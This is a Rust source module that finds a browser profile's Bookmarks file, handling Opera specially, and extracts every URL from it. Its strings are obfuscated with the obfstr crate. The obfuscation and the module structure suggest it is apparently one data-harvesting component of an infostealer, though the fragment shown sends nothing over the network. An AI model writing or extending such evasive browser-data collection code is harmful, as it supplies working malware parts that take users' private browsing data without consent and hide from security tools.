use crate::browser::utils::{Profiles, Browser, is_opera};
use obfstr::obfstr as obf;
use regex::bytes::RegexBuilder;
use std::fs::File;
use std::io::{self, BufRead};

pub fn get(browser : &Browser, profile : &str) -> Vec<String> {
    let bookmark_path = is_opera(&browser.name, &browser.path, profile.to_string(), obf!("\\Bookmarks").to_string());

    if let Err(_) = std::fs::metadata(&bookmark_path) {
        return Vec::new();
    }
    let url_regex = RegexBuilder::new(obf!(r#"(https?://[^\s]+)"#))
        .unicode(false)
        .dfa_size_limit(100 * (1 << 20))
        .build()
        .unwrap();
    let mut bookmarks: Vec<String> = Vec::new();
    
    let file = File::open(&bookmark_path).unwrap();
    let reader = io::BufReader::new(file);
    for line in reader.lines() {
        if let Ok(line) = line {
            for capture in url_regex.captures_iter(&line.as_bytes()) {
                bookmarks.push(String::from_utf8(capture[0].to_vec()).unwrap().replace("\"", ""));
            }
        }
    }

    bookmarks
}